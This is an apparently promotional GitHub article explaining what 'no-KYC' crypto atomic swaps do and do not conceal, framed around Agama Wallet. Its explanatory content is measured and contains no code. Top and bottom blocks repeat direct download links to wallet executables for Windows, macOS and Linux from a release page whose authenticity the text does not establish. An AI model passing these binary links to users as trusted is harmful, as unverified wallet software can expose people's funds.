[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# No-KYC Crypto Swaps: What "No KYC" Actually Means

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

A no-KYC swap is a trade that requires no identity verification because no intermediary collects it: two wallets exchange assets directly. What it does not mean is that the trade is invisible. Both legs are public transactions on their chains, and address-level linkage remains. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps and no account, KYC or identity verification.

## You'll see this if

You are comparing a peer-to-peer swap with an exchange withdrawal and the difference in friction is obvious but the difference in exposure is not.

| Question | Peer-to-peer swap | Exchange account |
|---|---|---|
| Identity document | Not requested by the mechanism | Usually required |
| Who holds funds mid-trade | Nobody; locks on-chain | The exchange |
| What the chain records | Both legs, addresses, amounts | The exchange's internal ledger plus a withdrawal |
| Account closure risk | None from a venue | Real; access depends on the operator |
| Privacy from chain analysis | Depends on how you acquired and spend the coins | Depends on the exchange's records |

## Why it happens

Identity collection exists because an intermediary has a customer relationship to police. A swap between two wallets has no intermediary, so there is nobody to collect a document or hold a balance.

That absence changes three things, and only three:

- **No account.** Nothing to freeze, close or restrict, because nothing holds your funds.
- **No deposit step.** The maker of Agama Wallet describes swaps as peer-to-peer between wallets, with funds staying in the user's wallet until the trade executes.
- **No venue records.** The only record is what the chains show.

It does not change what the chain shows. A swap is two transactions with visible inputs and outputs, and the amounts are public unless the chain itself hides them. Someone analysing the chain can see that an output was spent to a contract and that another was claimed shortly after, which is a recognisable pattern.

The cost side is separate and applies to both routes: a swap pays network fees on two chains and, per the maker's description, no platform fee. [Atomic swap fees](https://github.com/agama-wallet/atomic-swaps/blob/main/what-a-trade-costs.md) covers that split.

There is also a network-level exposure worth knowing: in SPV mode a wallet queries remote servers, and the privacy policy states that this can expose an IP address along with address queries and transaction broadcasts.

## Fix

Deciding whether a swap meets your requirement means separating three questions that "no KYC" bundles together.

1. **Ask who holds the funds.** If nobody does, the trade is peer-to-peer; if a service does, it is custodial whatever the interface says.
2. **Ask what identity is requested.** A swap needs none. A service that asks for a document before releasing funds is an exchange.
3. **Ask what the chain records.** Amounts, addresses and timing, unless the chain hides them. Plan for that being permanent.
4. **Ask how you acquired the coins.** A swap does not launder the history of an output; the coins arrive with their past.
5. **Ask what your network exposes.** SPV servers see queries; a node you run does not.

If the requirement is regulatory rather than personal, no swap design changes it: reporting obligations attach to the parties and the jurisdictions, not to the protocol.

## If that did not work

If a "no-KYC" service asks for a document, it is not a peer-to-peer swap and the label is marketing.

If a swap completes but the received coins are refused by a service later, the reason is the coins' history, not the swap, and no second trade removes that history. Chain analysis travels with the output.

If a trade is slow, the cause is liquidity or confirmation time rather than identity checks, since no check occurs.

If someone offers to improve privacy by "mixing" your swapped coins through their service, that is a custodial step with its own risk, and it is not part of the mechanism.

## Prevention

- **Read what the interface actually does with your funds.** Custody is the dividing line, not the wording.
- **Assume the chain record is permanent.** It is, and it is readable by anyone who cares to look, including services you may want to use later.
- **Prefer running your own node if network privacy matters.** It removes the SPV server from the path.
- **Check the pair's liquidity before trading.** A thin book is a wait, not a privacy feature.
- **Do not equate no-KYC with no-record.** [Cross-chain swaps](https://github.com/agama-wallet/atomic-swaps/blob/main/moving-value-between-chains.md) explains what the two legs reveal, including that the receiving address stays tied to the contract output that funded it.

## FAQ

### Does a no-KYC swap hide my transactions?

No. It removes the identity check, not the chain record. Both legs are public transactions with visible addresses and amounts.

### Is a no-KYC swap legal?

That depends on your jurisdiction and on what you do with the assets, not on the protocol. A swap does not create or remove reporting obligations that apply to you.

### Why does the wallet need no account?

Because there is nothing to log into: keys are held locally and the trade is between two wallets. The maker states no accounts, KYC or identity verification are required.

### Does a swap need an account anywhere?

No. Keys are held locally and the trade is between two wallets, so there is no login, profile or balance held by a third party. That is also why there is no password reset and no support channel that can restore access.

### Can a swap be traced back to me?

Chain analysis works on address clustering and on what other services know about your addresses. A swap leaves a recognisable pattern, so the honest answer is that it can be linked, not that it is anonymous.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [Cross-Chain Swaps: What They Are and Where They Fail](https://github.com/agama-wallet/atomic-swaps/blob/main/moving-value-between-chains.md)
- [What Is an Atomic Swap? Exchange Without an Intermediary](https://github.com/agama-wallet/atomic-swaps/blob/main/exchange-without-an-intermediary.md)
- [Are Atomic Swaps Safe? The Risks That Remain](https://github.com/agama-wallet/atomic-swaps/blob/main/are-they-safe.md)
- [Is Agama Wallet Safe? What Can and Cannot Be Verified](https://github.com/agama-wallet/agama-wallet/blob/main/is-it-safe-to-use.md)
